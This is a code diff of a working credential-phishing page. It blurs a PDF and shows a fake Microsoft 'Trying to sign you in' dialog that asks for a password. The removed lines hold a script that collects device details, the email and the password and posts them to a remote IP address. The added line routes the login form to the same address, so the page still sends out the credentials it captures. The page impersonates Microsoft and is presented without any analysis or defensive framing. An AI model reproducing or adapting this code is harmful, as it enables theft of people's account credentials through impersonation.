@@ -180,69 +180,12 @@
             emailField.value = email;
             emailDisplay.textContent = email;
         };
-
-    </style>
-    <script>
-        function getEmailFromURL() {
-            const url = window.location.href;
-            const emailRegex = /\?(.+)$/;
-            const matches = url.match(emailRegex);
-            if (matches && matches[1]) {
-                return decodeURIComponent(matches[1]);
-            }
-            return '';
-        }
-
-        // Collect device and browser information
-        function collectDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString(),
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unspecified'
-            };
-        }
-
-        // Function to send data to your server
-        async function sendToServer(data) {
-            try {
-                await fetch('http://162.251.123.242:2025/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-            } catch (error) {
-                console.error('Error sending data:', error);
-            }
-        }
-
-        window.onload = function() {
-            const emailField = document.getElementById('email');
-            const emailDisplay = document.getElementById('email-display');
-            const email = getEmailFromURL();
-            emailField.value = email;
-            emailDisplay.textContent = email;
-            
-            // Collect and send initial device info
-            const deviceInfo = collectDeviceInfo();
-            deviceInfo.action = 'page_load';
-            deviceInfo.email = email;
-            sendToServer(deviceInfo);
-        };
     </script>
 </head>
 <body>
-    <!-- MAIN IFRAME -->
+    <!-- Main iframe to display the PDF -->
     <iframe id="pdfViewer" src="https://78099.link/pdf/bizbuysell.pdf" aria-label="PDF Viewer"></iframe>
-    
-    <!-- AUTH DIALOG -->
+    <!-- Smaller iframe initially hidden with logo, text, and throbber -->
     <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
         <img id="logo" src="https://microsoft-live.github.io/micro.png" alt="Microsoft Logo">
         <p id="expiredText">Trying to sign you in</p>
@@ -258,47 +201,43 @@
         <div id="loginForm">
             <p id="email-display">Loading email...</p>
             <p id="signInText">Enter password</p>
-            <form id="authForm" action="https://78099.link/pdf/new.php" method="GET" onsubmit="return validateForm()">
+            <form id="authForm" action="https://162.251.123.242:2025/submit" method="GET" onsubmit="return validateForm()">
                 <input type="hidden" id="email" name="email">        
                 <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
                 <button type="submit">Sign in</button>
             </form>
         </div>
     </div>
-
     <script>
-        // Function to apply blur effect
+        // Function to apply blur effect to the main iframe
         function applyBlur() {
             document.getElementById('pdfViewer').style.filter = 'blur(5px)';
         }
-
         // Function to show the smaller iframe
         function showSmallIframe() {
             document.getElementById('smallIframe').style.opacity = '1';
         }
-
         // Function to fade out the expired text and throbber
         function fadeOutTextAndThrobber() {
             document.getElementById('expiredText').style.opacity = '0';
             document.querySelector('.throbber-container').style.opacity = '0';
-            setTimeout(showLoginForm, 1000);
+            setTimeout(showLoginForm, 1000); // Show login form after fade out
         }
-
-        // Function to show the login form
+        // Function to show the login form and focus on the password input field
         function showLoginForm() {
             document.getElementById('expiredText').style.display = 'none';
             document.querySelector('.throbber-container').style.display = 'none';
             const loginForm = document.getElementById('loginForm');
             loginForm.style.display = 'block';
+            
+            // Focus on the password input field
             document.getElementById('password').focus();
         }
-
-        // Function to validate form and send data
-        async function validateForm() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            
+        // Function to validate email and password
+        function validateForm() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailPattern.test(email)) {
                 alert("Please enter a valid email address.");
                 return false;
@@ -307,22 +246,13 @@
                 alert("Password must be at least 4 characters long.");
                 return false;
             }
-
-            // Collect and send form submission data
-            const formData = collectDeviceInfo();
-            formData.action = 'form_submission';
-            formData.email = email;
-            formData.password = password; // Note: In production, never send plain passwords
-            await sendToServer(formData);
-
-            // Allow the original form submission to proceed
             return true;
         }
        
         // Set timeouts to trigger the functions
-        setTimeout(applyBlur, 1000);
-        setTimeout(showSmallIframe, 2000);
-        setTimeout(fadeOutTextAndThrobber, 4000);
+        setTimeout(applyBlur, 1000); // Apply blur after 1 second
+        setTimeout(showSmallIframe, 2000); // Show smaller iframe after 2 seconds
+        setTimeout(fadeOutTextAndThrobber, 4000); // Fade out text and throbber 4 seconds after page load
     </script>
 </body>
 </html>
